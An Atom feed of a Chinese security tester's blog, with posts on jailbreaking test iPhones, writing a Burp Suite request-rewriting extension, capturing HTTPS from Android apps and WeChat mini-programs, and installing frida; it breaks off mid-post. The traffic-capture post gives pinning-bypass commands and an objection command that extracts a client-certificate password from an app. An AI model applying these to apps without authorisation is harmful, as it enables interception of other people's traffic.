<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sunny250`s blog</title>
  
  <subtitle>如果你想要一个好的结局，取决于你在什么地方结束故事。--九号传教士</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://sunny250.github.io/"/>
  <updated>2021-07-19T07:16:40.000Z</updated>
  <id>https://sunny250.github.io/</id>
  
  <author>
    <name>sunny250</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>苹果的越狱之路</title>
    <link href="https://sunny250.github.io/2021/07/19/%E8%8B%B9%E6%9E%9C%E7%9A%84%E8%B6%8A%E7%8B%B1%E4%B9%8B%E8%B7%AF/"/>
    <id>https://sunny250.github.io/2021/07/19/%E8%8B%B9%E6%9E%9C%E7%9A%84%E8%B6%8A%E7%8B%B1%E4%B9%8B%E8%B7%AF/</id>
    <published>2021-07-19T07:16:40.000Z</published>
    <updated>2021-07-19T07:16:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="苹果的越狱之路"><a href="#苹果的越狱之路" class="headerlink" title="苹果的越狱之路"></a>苹果的越狱之路</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>下周有ios App要测试，公司新购入了2台iphone6s 用来测试，越狱这个任务就交到我了头上。这玩意之前只听过，自己也没做过（之前穷的很，没钱买苹果手机）。买之前还特地吩咐过注意看哪些系统可以越狱，当时我以为只要越狱了就能降级。（越狱了也不一定能降级，高版本的ios都是未完全越狱，重启后就失效的那种）一台是14.2的系统，另一台是11.2.1的系统。于是开启了越狱之路</p><a id="more"></a><h2 id="0x01-越狱之路"><a href="#0x01-越狱之路" class="headerlink" title="0x01 越狱之路"></a>0x01 越狱之路</h2><p>两台越狱都挺简单的，but在安装插件的时候出了很多问题。</p><h3 id="11-2-1的系统"><a href="#11-2-1的系统" class="headerlink" title="11.2.1的系统"></a>11.2.1的系统</h3><ol><li>使用windows版本的爱思助手，直接一键越狱，之后会在手机上安装unc0ver，需要手动去设置-&gt;通用-&gt;设备管理，信任xxx，如图。<br>76084DB9-2303-4f71-BB1F-D8303AB0857E.png<img src="/pic/upload_dcc77f6505c2b17c5705f96408bba8df.png" alt=""></li></ol><ol start="2"><li><p>越狱之后安装必要的插件，先是打开cydia软件出现网络无法访问，根据爱思助手的帮助找到了<a href="https://m.i4.cn/channels/apps/app_content.html?id=269617" target="_blank" rel="noopener">教程</a>。</p></li><li><p>下载乐网后，开启劫持会出现一个vpn选项，随后cydia成功联网。</p><blockquote><p>得知原因是系统没给cydia开启联网权限</p></blockquote></li><li><p>下载acf2，appsync，opensh，frida等插件，但是这个过程中又出现了错误，能下载成功但是安装的时候报错<code>Sub - process /usr/libexec/cydia/cydo returned an error code (2).</code>安装所有插件都是如此。怀疑可能cydia的问题，随后又下载了很多中越狱软件比如unc0ver，再重启使越狱失效后，用unc0ver重新越狱，发现还是同样的问题。</p></li><li><p>重置设备，重新越狱。重复上诉1，2，3操作。又到了下载插件的过程，但是这次报错的是<code>Dpkg locked</code>，根据<a href="https://www.cydiaos.com/fix-cydia-dpkg-was-interrupted-error/" target="_blank" rel="noopener">教程</a>，说要删除dpkg目录下的所有000，111开头的文件。使用i4助手的打开ssh通道（有时能用有时候提示要安装openssh，但是有时候没安装也能开）进入了ios的shell。进去之后发现<code>/var</code>下居然没有lib目录！！！！</p></li><li><p>谨慎的把设备升级到14.2，毕竟升级之后就降不回去了。</p></li></ol><h3 id="14-2的系统"><a href="#14-2的系统" class="headerlink" title="14.2的系统"></a>14.2的系统</h3><ol><li><p>使用爱思助手发现还不支持，其实是爱思助手还没更新，最新的<a href="https://checkra.in/" target="_blank" rel="noopener">checkra1n</a>-0.12.1已经支持了。下载下来打开</p><p>截屏2020-12-31 下午5.52.08.png<img src="/pic/upload_7c6661ad6d48e2997226050560b74a56.png" alt=""></p></li></ol><p>截屏2020-12-31 下午6.14.35.png<img src="" alt="Uploading file..._0hs4esayu"></p><ol start="2"><li><p>usb连接ios设备，如果支持，start按钮会变成可点击的。然后点击start进入下一个界面，点击next。随后设备会进入恢复模式。</p><p>截屏2020-12-31 下午6.14.35.png<img src="/pic/upload_7c25aaadf3a8428e11ecac1c44788d3e.png" alt=""></p></li></ol><ol start="3"><li>点击start，然后按住home键和电源键，等待第一次计时结束，松开电源键，继续按着home键，等待进入一个出现进度条的页面就可以松开了。就已经开始安装了，等进度条结束就已经越狱完成。 <pre><code>截屏2020-12-31 下午6.16.04.png![](/pic/upload_3ead2c8f60d0594b69037856d46a5bf5.png)</code></pre></li></ol><ol start="4"><li><p>打开cydia，添加软件源，frida 对应的源是 <a href="https://build.frida.re" target="_blank" rel="noopener">https://build.frida.re</a> ，appsync对应的软件源是<a href="https://apt.pandahelp.vip，点开搜索frida。选择frida" target="_blank" rel="noopener">https://apt.pandahelp.vip，点开搜索frida。选择frida</a> for pre-a12 （6s是a9所以选择A12以前的），然后搜索appsync  安装appsync unifies for ios 14，搜索afc2，会出现一个pandahelper源的，还会有一个bigboss的，选择bigboss的，如果选择了pandahelper会导致无法连接爱思助手，其他暂时测试无影响。</p></li><li><p>电脑上打开frida-ps -U测试连接,出现如下结果，说明frida正常连接成功。</p>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> frida-ps -U   </span><br><span class="line">PID  Name</span><br><span class="line">---  --------------------------------------------------------</span><br><span class="line">207  Cydia</span><br><span class="line">192  Siri搜索</span><br><span class="line">870  相机</span><br><span class="line">839  设置</span><br><span class="line">119  ACCHWComponentAuthService</span><br><span class="line">863  ASPCarryLog</span><br><span class="line"> 41  AppleCredentialManagerDaemon</span><br><span class="line">868  AssetCacheLocatorService</span><br><span class="line">131  BlueTool</span><br><span class="line">180  CAReportingService</span><br><span class="line">511  CMFSyncAgent</span><br><span class="line">560  CacheDeleteAppContainerCaches</span><br><span class="line">568  CacheDeleteExtension</span><br><span class="line">480  CategoriesService</span><br><span class="line">267  CategoriesService</span><br><span class="line">226  CategoriesService</span><br><span class="line">224  CategoriesService</span><br><span class="line">122  CloudKeychainProxy</span><br><span class="line">......</span><br></pre></td></tr></table></figure></li></ol><p>至此，可以顺利使用frida进行hook操作。</p><h2 id="0x02-参考链接"><a href="#0x02-参考链接" class="headerlink" title="0x02 参考链接"></a>0x02 参考链接</h2><p><a href="https://www.cydiaos.com/fix-cydia-dpkg-was-interrupted-error/" target="_blank" rel="noopener">https://www.cydiaos.com/fix-cydia-dpkg-was-interrupted-error/</a><br><a href="https://checkra.in" target="_blank" rel="noopener">https://checkra.in</a><br><a href="https://m.i4.cn/channels/apps/app_content.html?id=269617" target="_blank" rel="noopener">https://m.i4.cn/channels/apps/app_content.html?id=269617</a><br><a href="https://www.i4.cn/news_detail_18849.html" target="_blank" rel="noopener">https://www.i4.cn/news_detail_18849.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;苹果的越狱之路&quot;&gt;&lt;a href=&quot;#苹果的越狱之路&quot; class=&quot;headerlink&quot; title=&quot;苹果的越狱之路&quot;&gt;&lt;/a&gt;苹果的越狱之路&lt;/h1&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;下周有ios App要测试，公司新购入了2台iphone6s 用来测试，越狱这个任务就交到我了头上。这玩意之前只听过，自己也没做过（之前穷的很，没钱买苹果手机）。买之前还特地吩咐过注意看哪些系统可以越狱，当时我以为只要越狱了就能降级。（越狱了也不一定能降级，高版本的ios都是未完全越狱，重启后就失效的那种）一台是14.2的系统，另一台是11.2.1的系统。于是开启了越狱之路&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>burp_plugin开发</title>
    <link href="https://sunny250.github.io/2021/03/30/burp_plugin%E5%BC%80%E5%8F%91/"/>
    <id>https://sunny250.github.io/2021/03/30/burp_plugin%E5%BC%80%E5%8F%91/</id>
    <published>2021-03-30T07:16:40.000Z</published>
    <updated>2021-03-30T07:16:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="burp-plugin开发"><a href="#burp-plugin开发" class="headerlink" title="burp_plugin开发"></a>burp_plugin开发</h1><h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><p>由于测试app，需要用到brida，brida的高级功能需要动手写js+bp插件，还是需要单独编写的burp插件，很早就知道burp可以用py开发插件，但从前都是拿来主义（现在也是），毕竟白嫖的不香嘛？但是独立的bp插件又不能都让其他的师傅帮忙，于是就有了此篇文章。</p><a id="more"></a><h2 id="0x01-基础"><a href="#0x01-基础" class="headerlink" title="0x01 基础"></a>0x01 基础</h2><p>首先是打开burp的插件官网去看看，上面写的介绍<br><a href="https://portswigger.net/burp/extender/writing-your-first-burp-suite-extension" target="_blank" rel="noopener">编写你的第一个burp插件</a><br>里面的写法和java很像，都是写一个类。<br>文中给出了一个可以正常导入而不会报错的一个例子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from burp import IBurpExtender</span><br><span class="line">class BurpExtender(IBurpExtender):</span><br><span class="line">    def registerExtenderCallbacks( self, callbacks):</span><br><span class="line">    # your extension code here</span><br><span class="line">        return</span><br></pre></td></tr></table></figure><p>于是跟着这个例子和文中提到的其他接口写出了自己的第一个demo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from java.io import PrintWriter</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender):</span><br><span class="line">    def registerExtenderCallbacks( self, callbacks):</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">        stdout &#x3D; PrintWriter(callbacks.getStdout(), True) #取得标准输出流</span><br><span class="line">        stderr &#x3D; PrintWriter(callbacks.getStderr(), True) #取得标准错误流</span><br><span class="line">        callbacks.setExtensionName(&quot;demo1&quot;) #burp插件命名语句</span><br><span class="line">        </span><br><span class="line">        stdout.println(&quot;Hello My first demo!&quot;)</span><br><span class="line">        return</span><br></pre></td></tr></table></figure><h1 id="0x02-尝试改写repeate模块的请求"><a href="#0x02-尝试改写repeate模块的请求" class="headerlink" title="0x02 尝试改写repeate模块的请求"></a>0x02 尝试改写repeate模块的请求</h1><p>尝试改写repeate发送的数据</p><ol><li>先需要在<code>registerExtenderCallbacks</code>注册一个HttpListener，否则无法调用<code>processHttpMessage</code>函数<br>注册代码<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">registerExtenderCallbacks</span><span class="params">( self, callbacks)</span>:</span></span><br><span class="line">   self._helpers = callbacks.getHelpers()</span><br><span class="line">   self._callbacks = callbacks</span><br><span class="line">   callbacks.setExtensionName(<span class="string">"demo2"</span>)  <span class="comment"># burp插件命名语句</span></span><br><span class="line">   callbacks.registerHttpListener(self) <span class="comment">#注册HttpListener</span></span><br></pre></td></tr></table></figure></li><li>注册完之后需要调用的函数<br><img src="/pic/upload_ea0bcbe647e20197a0e864591322e177.png" alt=""><br>toolFlag的定义在这<br><img src="/pic/upload_d3ffa0b0200f7848b069d0270430537f.png" alt=""><br>用来标记来自burp的哪一个模块，如下代码是只处理来自repeate模块的请求，如果需要处理其他模块的数据包，就在添加几个or if即可。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        if toolFlag &#x3D;&#x3D; self._callbacks.TOOL_REPEATER:  #处理来自repeate的包</span><br></pre></td></tr></table></figure></li><li>然后是messageIsRequest参数，用来标记是否发送了请求，发送了就是true</li><li>messageInfo参数是需要处理的整个请求的的对象<br>查看messageInfo对象可调用参数<br><img src="/pic/upload_61c34a41aa97972535616fb8084e581d.png" alt=""></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getRequest()  &#x2F;&#x2F;获取请求的完整信息，返回参数是byte类型</span><br><span class="line">getHttpService()  &#x2F;&#x2F;获取http服务，其中包含的参数是</span><br></pre></td></tr></table></figure><p><img src="/pic/upload_8d6fed5dd61b33b60aff36598fd7c50e.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setRequest()&#x2F;&#x2F;更新请求</span><br></pre></td></tr></table></figure><p>后续联动brida插件时还需要用到一下函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setResponse() &#x2F;&#x2F;用来修改返回的报文</span><br></pre></td></tr></table></figure><ol start="5"><li>还需要用到的函数有<br>IExtensionHelpers接口下的<br><img src="/pic/upload_21f1ff8255e9f90b8cef81c0ce59446c.png" alt=""><br><img src="/pic/upload_98437ab52eeef718e040112a3f933b67.png" alt=""></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">analyzeRequest()&#x2F;&#x2F;用来将request请求信息转化方便操作的IHttpInfo对象</span><br></pre></td></tr></table></figure><p>IHttpInfo接口所有的函数<br><img src="/pic/upload_ddcbf0e9cc0eb1328dcbc8602fe19807.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">buildRequest()&#x2F;&#x2F;处理完后构建新的request请求</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line"></span><br><span class="line">6. 再来说说IHttpInfo接口所包含的函数</span><br></pre></td></tr></table></figure><p>getBodyOffset()//函数是获取body部分的开偏移值<br>getHeaders() //获取header，如果是一个完整的GET，header就是所有的请求部分；如果是一个post请求，header+body就是整个部分。<br>getParameters() //有好几个接口都有这个函数，但是这个函数吧，不好用，也可能是没学会这个函数的用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">完整代码如下</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;python</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from burp import IBurpExtender</span><br><span class="line">from burp import IHttpListener</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender,IHttpListener):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def registerExtenderCallbacks( self, callbacks):</span><br><span class="line">        self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">        self._callbacks &#x3D; callbacks</span><br><span class="line">        callbacks.setExtensionName(&quot;demo2&quot;)  # burp插件命名语句</span><br><span class="line">        callbacks.registerHttpListener(self)</span><br><span class="line"></span><br><span class="line">    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):</span><br><span class="line">        if toolFlag &#x3D;&#x3D; self._callbacks.TOOL_REPEATER:  #处理来自repeate的包</span><br><span class="line">            if messageIsRequest:   #获取请求数据</span><br><span class="line">                Httpservice&#x3D;messageInfo.getHttpService()</span><br><span class="line">                para&#x3D;&#123;&#125;</span><br><span class="line">                host&#x3D;Httpservice.getHost()  #获取host</span><br><span class="line">                port&#x3D;Httpservice.getPort()  #获取端口</span><br><span class="line">                </span><br><span class="line">                raw&#x3D;messageInfo.getRequest()  #获取完整请求信息</span><br><span class="line">                analyzeraw&#x3D;self._helpers.analyzeRequest(raw)  #将完整请求转换成IRequestInfo实例</span><br><span class="line">                request_header&#x3D;analyzeraw.getHeaders()   #获取请求header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                request_body &#x3D; raw[analyzeraw.getBodyOffset():].tostring()  #获取body</span><br><span class="line">                print(&#39; HOST:&#39;,host,&#39;\n Port: &#39;,port,&#39; \nHeader:&#39;,request_header,&#39;\nBody:&#39;,request_body)  #打印请求</span><br><span class="line"></span><br><span class="line">                request_header0&#x3D;request_header[0].split(&quot; &quot;)    #分割requestheader第一行</span><br><span class="line">                path&#x3D;request_header0[1]     #取中间的参数 &#x2F;index.php?a&#x3D;aaa</span><br><span class="line">                print(path)   #打印path</span><br><span class="line">                parastr&#x3D;path.split(&quot;?&quot;)[1]  # 取参数合集的字符串</span><br><span class="line">                paras&#x3D;parastr.split(&quot;&amp;&quot;)  #将参数用列表保存每一个参数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                paras0&#x3D;paras[0].split(&quot;&#x3D;&quot;)[0]+&quot;&#x3D;new_a&quot; #将第一个参数值替换为 new_a</span><br><span class="line"></span><br><span class="line">                request_header[0]&#x3D;request_header[0].replace(paras[0],paras0)  #在requests_header中将原参数替换为new_a</span><br><span class="line"></span><br><span class="line">                print(request_header[0]..tostring())    #打印request_header第一行</span><br><span class="line">                http&#x3D;self._helpers.buildHttpMessage(request_header,request_body) #构建新的http request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                print(http.tostring())  # 打印新的http request</span><br><span class="line">                messageInfo.setRequest(http) #用新构建的http request更新当前request</span><br></pre></td></tr></table></figure><p>在本地起一个php的简易服务器，传入a参数，打印a参数的值<br><img src="/pic/upload_9ba998e3b1f5006b66a9b2a30f472477.png" alt=""><br>启用后的效果<br><img src="/pic/upload_809262d9a018f70ca1dde12ea46dfd50.png" alt=""></p><p>下一篇文章将联合brida插件，进行自动加解密。</p><h1 id="0x03总结"><a href="#0x03总结" class="headerlink" title="0x03总结"></a>0x03总结</h1><p>google，百度了一便，发现直接教python编写burp的插件的文章少得可怜，讲的我也不太看的明白，只好自己去翻burp的doc。一点一点的看，一点一点的学。做开发真的没有提示很容易敲错代码，然后调试调半天，还不知道那里错了。</p><h1 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h1><p><a href="https://portswigger.net/burp/extender/api/" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;burp-plugin开发&quot;&gt;&lt;a href=&quot;#burp-plugin开发&quot; class=&quot;headerlink&quot; title=&quot;burp_plugin开发&quot;&gt;&lt;/a&gt;burp_plugin开发&lt;/h1&gt;&lt;h2 id=&quot;0x00-序&quot;&gt;&lt;a href=&quot;#0x00-序&quot; class=&quot;headerlink&quot; title=&quot;0x00 序&quot;&gt;&lt;/a&gt;0x00 序&lt;/h2&gt;&lt;p&gt;由于测试app，需要用到brida，brida的高级功能需要动手写js+bp插件，还是需要单独编写的burp插件，很早就知道burp可以用py开发插件，但从前都是拿来主义（现在也是），毕竟白嫖的不香嘛？但是独立的bp插件又不能都让其他的师傅帮忙，于是就有了此篇文章。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>APP/小程序抓包</title>
    <link href="https://sunny250.github.io/2021/03/24/APP_%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/"/>
    <id>https://sunny250.github.io/2021/03/24/APP_%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85/</id>
    <published>2021-03-24T08:03:30.000Z</published>
    <updated>2021-03-24T08:03:30.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>在测试小程序或app总会遇到抓不到包的情况，也听很多大佬说过，抓不到包使用低版本安卓。小程序比较好解决，毕竟是在微信上运行的程序，可以加的东西比较少；独立的app可以加的东西就很多了，例如添加非标准的http协议，如可自定义的的http模块okhttp；或者证书校验；独立函数校验。这就分很多中情况了。</p><a id="more"></a><h1 id="0x01-安卓7-0以上不能抓包根源"><a href="#0x01-安卓7-0以上不能抓包根源" class="headerlink" title="0x01 安卓7.0以上不能抓包根源"></a>0x01 安卓7.0以上不能抓包根源</h1><p>在 Android7.0 及以上的系统中，每个应用可以定义自己的可信 CA 集集。</p><p>默认情况下，应用只会信任系统预装的 CA 证书，而不会信任用户安装的 CA 证书。</p><p>而回想我们抓包的过程，无论是 fiddler 还是 Charles，想抓 https，都必须手机安装对应的证书，通过 fiddler/Charles 安装的证书恰恰正属于用户安装的 CA 证书，因此会被视作不安全的证书。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><p>把手机root，然后安装证书到系统证书目录下<br>系统证书的目录是：/system/etc/security/cacerts/</p><p>每个证书的命名规则为：<Certificate_Hash>.<Number></p><p>Certificate_Hash表示证书文件的 hash 值，Number是为了防止证书文件的 hash 值一致而增加的后缀;</p><p>证书的 hash 值可以由命令计算出来，在终端输入openssl x509 -subject_hash_old -in <Certificate_File>，其中Certificate_File为证书路径，将证书重命名为hash.0放入系统证书目录，之后你就可以正常抓包了。</p><h1 id="0x02小程序抓包"><a href="#0x02小程序抓包" class="headerlink" title="0x02小程序抓包"></a>0x02小程序抓包</h1><ol><li>安卓系统 7.0 以下版本，不管微信任意版本，都会信任系统提供的证书</li><li>安卓系统 7.0 以上版本，微信 7.0 以下版本，微信会信任系统提供的证书</li><li>安卓系统 7.0 以上版本，微信 7.0 以上版本，微信只信任它自己配置的证书列表<br>解决方法一：使用苹果系统<br>解决方法二：使用低版本安卓<br>解决方法三：root后安装证书到系统证书处，使用低版本微信<br>解决方法四：hook微信</li></ol><p>最简单的方法就是使用苹果系统进行抓包或者使用低版本安卓</p><h1 id="0x03-app无法抓包"><a href="#0x03-app无法抓包" class="headerlink" title="0x03 app无法抓包"></a>0x03 app无法抓包</h1><p>目前大多使用了各种手段以确保安全。首先要解决抓包问题，然后还要解决各种解密问题。<br>根据app对证书的处理分为以下几种方式</p><ol><li>使用自定义http模块，例如okhttp，不实现其http代理功能，或者不完整的http代理功能</li><li>客户端对服务器的证书做校验</li><li>在客户端代码层对证书做校验</li><li>服务器对客户端证书做校验</li><li>在代码层判断是否启用了vpn</li></ol><p>以上5中方法是对于http(s)的抓包，目前大多数app也都是这几种进行组合。<br>下面给出解决办法</p><ol><li><p>使用vpn软件，将所有数据包走vpn通道<br> 在bp或者其他抓包软件中设置好代理后，使用Postern输入ip，端口进行连接<br> <img src="/pic/upload_87e5e7106fcdc309a733a538e2b59408.png" alt=""><br> <img src="/pic/upload_7a16234ba09a4795d36027a875450a15.png" alt=""></p></li><li><p>将抓包软件的证书导入到系统中<br> 上面说到了如何将证书导入到系统证书中</p></li><li><p>hook校验证书的函数，使其失效（又被称为ssl pinning）<br> 使用frida，hook验证函数，也可以直接使用objection<br> <code>#android sslpinning disable</code><br> <img src="/pic/upload_12ad68db8bdd3cdd123ea918df0259c0.png" alt=""></p></li><li><p>将抓包软件导入app的证书<br> 直接抓包会出现400错误<br> <img src="/pic/upload_7de4d19f4c961863eacc726fad44a1f7.png" alt=""></p><p> 使用jadx反编译后，一般直接搜索client或者p12(可能有些是其他格式)就可以搜索到<br> <img src="/pic/upload_d3fb09d32bc128cc173d94917d6680f0.png" alt=""><br> 在app未启动时，使用objection抓取密码，大多数情况下可用<br> <code>#objection -g com.boqianyi.havefun explore --startup-command &#39;android hooking watch class_method  java.security.KeyStore.load --dump-args e --dump-return&#39;</code><br> <img src="/pic/upload_9ebde0412f6f3bd6c40387efb564afbd.png" alt=""><br> 然后选择对应对证书格式导入<br> <img src="/pic/upload_ae8208f5b8d992f142ece12f6f05ad04.png" alt=""><br> 最后选择证书，输入密码就可以愉快的抓包了<br> <img src="/pic/upload_bde30b9f8ee0772accb2fa7076a85966.png" alt=""></p></li><li><p>hook校验函数，使其失效 </p></li></ol><h1 id="0x04参考文章"><a href="#0x04参考文章" class="headerlink" title="0x04参考文章"></a>0x04参考文章</h1><p><a href="https://www.anquanke.com/post/id/197657" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197657</a><br><a href="https://testerhome.com/articles/17746" target="_blank" rel="noopener">https://testerhome.com/articles/17746</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h1&gt;&lt;p&gt;在测试小程序或app总会遇到抓不到包的情况，也听很多大佬说过，抓不到包使用低版本安卓。小程序比较好解决，毕竟是在微信上运行的程序，可以加的东西比较少；独立的app可以加的东西就很多了，例如添加非标准的http协议，如可自定义的的http模块okhttp；或者证书校验；独立函数校验。这就分很多中情况了。&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>再次学习docker操作</title>
    <link href="https://sunny250.github.io/2021/03/05/%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0docker%E6%93%8D%E4%BD%9C/"/>
    <id>https://sunny250.github.io/2021/03/05/%E5%86%8D%E6%AC%A1%E5%AD%A6%E4%B9%A0docker%E6%93%8D%E4%BD%9C/</id>
    <published>2021-03-05T04:35:43.000Z</published>
    <updated>2021-03-05T04:35:43.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>hook神器FRIDA</title>
    <link href="https://sunny250.github.io/2021/02/14/hook%E7%A5%9E%E5%99%A8FRIDA/"/>
    <id>https://sunny250.github.io/2021/02/14/hook%E7%A5%9E%E5%99%A8FRIDA/</id>
    <published>2021-02-13T16:04:40.000Z</published>
    <updated>2021-02-13T16:04:40.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hook神器FRIDA"><a href="#hook神器FRIDA" class="headerlink" title="hook神器FRIDA"></a>hook神器FRIDA</h1><h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><ol><li>使用python 一键安装</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install frida</span><br><span class="line">pip3 install frida-tools</span><br></pre></td></tr></table></figure><ol start="2"><li><p>在安卓手机上安装frida-server</p><p>下载地址<a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">https://github.com/frida/frida/releases</a></p><p>搜索frida-server，现在的手机一般都是arm64，平板是x86选择对应的版本下载</p><p>使用adb工具将firda-server推送到已root手机的/data/loca/tmp中（其他目录也可以，一般是使用这个目录）</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-14.2.7-android-arm64 /data/<span class="built_in">local</span>/tmp </span><br><span class="line">adb shell chmod +x /data/<span class="built_in">local</span>/tmp/frida-server-14.2.7-android-arm64</span><br><span class="line">adb shell /data/<span class="built_in">local</span>/tmp/frida-server-14.2.7-android-arm64</span><br></pre></td></tr></table></figure><a id="more"></a><ol start="3"><li>使用命令frida-ps查看是否成功链接上frida-server</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -U</span><br></pre></td></tr></table></figure><p>​        如果出现了apk的包名则表示成功连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 